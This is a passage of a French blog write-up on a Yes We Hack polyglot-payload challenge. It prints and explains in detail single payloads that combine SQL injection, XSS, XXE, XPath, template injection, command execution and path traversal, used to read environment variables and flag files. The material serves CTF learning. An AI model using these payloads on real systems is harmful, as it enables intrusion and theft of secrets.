class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="cm">/* &#34;]|//user[1=1]/password/text()|//user[1=&#34;]{system(&#39;env&#39;)}{*{% if &#39;1&#39;==1 %}{{[&#39;env&#39;]|filter(&#39;system&#39;)}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} &lt;%= ENV[&#39;FLAG&#39;] %&gt;/../../../../../../../proc/self/environ
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tout fonctionne, c&rsquo;est super.</p>
+<h2 class="heading-element" id="la-xxe"><span>La XXE</span>
+  <a href="#la-xxe" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Hélas, je n&rsquo;ai pas réussi dans le temps imparti à intégrer la XXE.
+Pour que la XXE passe il fallait que dès le début la payload soit acceptée comme du XML recevable et donc commencer par une balise sans aucune quote.</p>
+<p>Si le <code>&lt;&lt;</code> peut passer sur la SQLi (un bitshift), je ne savais pas ce que je pouvais mettre après qui rendrais le tout valable.</p>
+<p>Cependant, ma payload finale (n&rsquo;étant pas celle que l&rsquo;on a construit à tête reposée ensemble) était la suivante :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">＂</span><span class="p">[.</span><span class="o">&gt;</span><span class="p">],[.,][</span><span class="err">＇</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="err">＇&#39;</span><span class="cm">/*;env;#;＂ UNION SELECT 1,2,flag FROM flag-- &#34;]|//user[1=1]/password/text()|//user[1=&#34;]{system(&#39;env&#39;)}{*{% if &#39;1&#39;==1 %}{{[&#39;env&#39;]|filter(&#39;system&#39;)}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*}&lt;img src=x onerror=alert(flag)&gt;&lt;%= ENV[&#39;FLAG&#39;] %&gt;*/</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span><span class="n">y</span><span class="o">=</span><span class="err">&#39;</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On peut voir qu&rsquo;elle est légèrement plus longue et laisse beaucoup de place à l&rsquo;optimisation…
+Mais est-ce que l&rsquo;on peut voir ça ?</p>
+<h2 class="heading-element" id="la-payload-gagnante-"><span>La payload gagnante !</span>
+  <a href="#la-payload-gagnante-" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Je ne l&rsquo;ai pas dit jusqu&rsquo;ici mais le challenge a été remporté par <strong>Ruulian</strong> suivi de près (1 caractère) par <strong>Mizu</strong>. Et en plus de nous présenter le scoreboard, une fois le challenge terminé les payloads ont été rendues publiques.</p>
+<p>Et voici la payload qui a gagné</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">or</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span><span class="p">[.</span><span class="o">&gt;</span><span class="p">],[.</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span><span class="p">,</span><span class="s">&#34;]|*?&gt;&lt;!DOCTYPE x[&lt;!ENTITY x SYSTEM &#34;</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span><span class="s">&#34;&gt;]&gt;&lt;svg onload=&#34;</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="s">&#34;&gt;&amp;x;{system(&#34;</span><span class="n">env</span><span class="s">&#34;)}{*{{[&#34;</span><span class="n">env</span><span class="s">&#34;]|map(&#34;</span><span class="n">system</span><span class="s">&#34;)and lipsum.__globals__.os.environ}}*}&lt;%=`env`%&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">union</span> <span class="n">select</span><span class="o">*</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">*</span><span class="n">from</span> <span class="n">flag</span><span class="p">;</span><span class="n">env</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Je vais me pencher spécifiquement sur les différences afin de ne pas avoir trop d&rsquo;informations (on en a déjà pas mal à ce niveau je pense). Et faisons cela dans l&rsquo;ordre.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="k">or</span><span class="w"> </span><span class="mi">1</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On commence par une ligne permettant de rendre valide la SQLi 2 mais aussi la XXE. En effet, le fait de commencer avec une balise peut rendre cela en XML syntaxiquement correct, et donc pas d&rsquo;erreur, pendant que la SQLi nous fait un bitshift <code>&lt;&lt;</code> sur avec <em>NULL</em> car le <code>?</code> en SQLite donne cette valeure (je l&rsquo;ignorais) et le <code>or 1</code> pour ensuite compléter la requête.</p>
+<p>Ensuite on commence une nouvelle ligne :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">--</span><span class="p">[.</span><span class="o">&gt;</span><span class="p">],[.</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Avec au début <code>--</code> afin de commenter pour la SQLi2, je ne vais pas spécialement rééxpliquer (du moins pas de suite) le code brainfuck, mais ensuite nous avons une balise fermant <code>&lt;/script&gt;</code>.
+L&rsquo;objectif de cette balise est de ne plus s&rsquo;embêter dans la XXS 2.</p>
+<p>En effet, en dépit de la quote sur la XSS 2, la fermeture de balise sera bien interprétée. Par conséquent plus de problème de quote avec cette XSS.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">,</span><span class="s">&#34;]|*?&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cette partie permet 2 choses : Finir le code brainfuck, et exploiter la XPath. La double quote nous fera rentrer dans la payload XPath et le <code>|*</code> serait en quelque sort un <code>OR 1=1</code>. Pour rester honnête j&rsquo;ai encore de la difficulté à comprendre pourquoi <code>?&gt;</code> n&rsquo;a pas déclenché d&rsquo;erreur mais il semblerait que selon le parseur utilisé la requête soit bien interprétée puis la suite ignorée.
+Et bien sûr le <code>?&gt;</code> sert aussi à fermer la balise qui a été ouverte au tout début de la payload.</p>
+<p>On retrouve ensuite la payload XXE + XSS</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">x</span><span class="p">[</span><span class="o">&lt;!</span><span class="n">ENTITY</span> <span class="n">x</span> <span class="n">SYSTEM</span> <span class="s">&#34;/dev/shm/flag.txt&#34;</span><span class="o">&gt;</span><span class="p">]</span><span class="o">&gt;&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="s">&#34;alert(flag)&#34;</span><span class="o">&gt;&amp;</span><span class="n">x</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ici nous somme sur quelque chose de particulièrement malin. Si on connait déjà la partie XXE, et il y a une légère différence pour la partie XSS.
+Puisque nous avons fermé la balise script de la 2ème XSS, une seule et même balise peut nous suffir pour exploiter les 2 XSS. Ce que l&rsquo;on fait avec la balise <code>svg</code> permettant une payload plus courte que la <code>img</code> que j&rsquo;ai utilisée. Juste après on ajoute notre <code>&amp;x</code> pour permettre l&rsquo;execution de la XXE et c&rsquo;est tout bon.</p>
+<p>Passons le smarty qui est similaire à notre payload et voyons plutôt l&rsquo;ensemble Jinja2 + Twig.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;env&#34;</span><span class="p">]</span><span class="o">|</span><span class="nb">map</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span><span class="ow">and</span> <span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">}}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On voit une seule payload sans condition pour les 2 Moteurs de templates. Et c&rsquo;est dû à l&rsquo;utilisation du filtre <code>map</code> plutôt que <code>filter</code> (que j&rsquo;ai utilisé).
+En effet, ce filtre existe dans les 2 Moteurs et s&rsquo;il affiche <code>env</code> au Twig il ne crééra qu&rsquo;un objet <code>map</code> en Jinja2 mais sans erreur équivalent à True, le <code>and lipsum.__globals__.os.environ</code> étant donc ensuite intérprété en Jinja2 et affichant à son tour l&rsquo;environnement.</p>
+<p>On continue avec la payload ERB</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&lt;%=</span><span class="err">`</span><span class="n">env</span><span class="err">`</span><span class="o">%&gt;</span><span class="err">&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>L&rsquo;utilisation des backticks ne pouvait pas fonctionner avec ma payload, celles-ci créant des erreurs dans d&rsquo;autre challenges. Cependant ici on est sur une ligne SQL commentée avec un autre saut de ligne ensuite. La payload fonctionne bien sans erreur pour les autres. Et la simple quote ensuite pour fermer la string SQL de la 1ère SQLi. Oui, car si vous l&rsquo;avez bien remarqué depuis le début uniquement des double quote ont été utilisée, justement pour cette SQLi.</p>
+<p>La fin est ensuite assez simple à comprendre.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">union</span> <span class="n">select</span><span class="o">*</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="o">*</span><span class="n">from</span> <span class="n">flag</span><span class="p">;</span><span class="n">env</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cet <code>union</code> sera interprété par les 2 SQLi, on utilise des <code>*</code> pour limiter le nombre d&rsquo;espace et au bout on ajoute la commande <code>env</code> pour le bash. Et pour finir bien sûr la path traversal qui doit rester à la fin.</p>
+<p>Et le brainfuck ?
+Bien sûr il est valable avec une payload qui donne :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-brainfuck" data-lang="brainfuck"><span class="line"><span class="cl"><span class="nv">&lt;</span><span class="nb">--</span><span class="k">[</span><span class="nt">.</span><span class="nv">&gt;</span><span class="k">]</span><span class="nt">,</span><span class="k">[</span><span class="nt">.</span><span class="nv">&lt;&gt;</span><span class="nt">,</span><span class="k">]</span><span class="nv">&gt;&lt;</span><span class="k">[</span><span class="nv">&lt;</span><span class="nt">.</span><span class="nv">&gt;</span><span class="k">]</span><span class="nv">&gt;&lt;&gt;</span><span class="k">[]</span><span class="nt">...</span><span class="nv">&lt;&gt;</span><span class="nt">,,............</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On commence par aller une adresse plus loin et on décrémente 2 fois sa valeur, elle ne vaut donc pas 0. La 1ère boucle va par conséquent l&rsquo;afficher et afficher les valeurs aux octets suivant <code>[.&gt;]</code> puis on va lire le STDIN avec un <code>&lt;&gt;</code> au milieu qui au final s&rsquo;annule.</p>
+<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
+  <a href="#conclusion" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>J&rsquo;ai trouvé ce challenge intéréssant mais aussi amusant, c&rsquo;est purement ce que j&rsquo;aime dans des challenges : Avoir un puzzle à résoudre plus qu&rsquo;un concours de connaissance.
+Bien sûr, ici, il me manquait des infos, notamment le <code>?</code> qui donne <code>NULL</code> en SQLi ou alors le fonctionnement de la Xpath ultra réduite. Mais j&rsquo;ose croire qu&rsquo;avec plus de temps (et de la doc), je serai venu à bout de ce challenge, même sans avoir la payload la plus courte.</p>
+<p>J&rsquo;ai pu discuter un peu avec BitK et d&rsquo;autre participants, et il en est ressorti que l&rsquo;ajout de la XXE était clairement la plus compliquée. Et une quesiton en est sortie &ldquo;Quels payload/Challenges pourrait-on rajouter ?&rdquo;.
+Je pense qu&rsquo;essayer de jouer sur plusieurs DBMS et rajouter du LDAP serait quelque chose de faisable et d&rsquo;intéréssant, qui sait ? Pour la prochaine année !</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Mis à jour le 2025-07-11 11:49:04">Mis à jour le 2025-07-11&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/payload-plz/index.md" title="Ouvrir le Markdown" class="link-to-markdown">Ouvrir le Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Partager via X" data-sharer="twitter" data-url="https://driikolu.fr/posts/payload-plz/" data-title="Payload Plz - Analyse Du Challenge Yes We Hack" data-via="driikolu"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Partager via Facebook" data-sharer="facebook" data-url="https://driikolu.fr/posts/payload-plz/"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Partager via 微博" data-sharer="weibo" data-url="https://driikolu.fr/posts/payload-plz/" data-title="Payload Plz - Analyse Du Challenge Yes We Hack"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/word_worker_wu/" class="post-nav-item" rel="prev" title="BreizhCTF 2022 - Word Worker"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BreizhCTF 2022 - Word Worker</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contenus"><h2 class="toc-title">Contenus&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Propulsé par <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.147.9"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Thème - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.20"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://x.com/driikolu"target="_blank" rel="external nofollow noopener noreferrer">Driikolu</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Retour en Haut"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Ce site Web fonctionne mieux quand JavaScript est activé.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copier dans le presse-papiers","editLockTitle":"Verrouiller le bloc de code modifiable","editUnLockTitle":"Déverrouiller le bloc de code modifiable","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"J'ai compris !","link":"En apprendre plus","message":"Ce site Web utilise des Cookies pour améliorer votre expérience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"version":"v0.3.20"};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
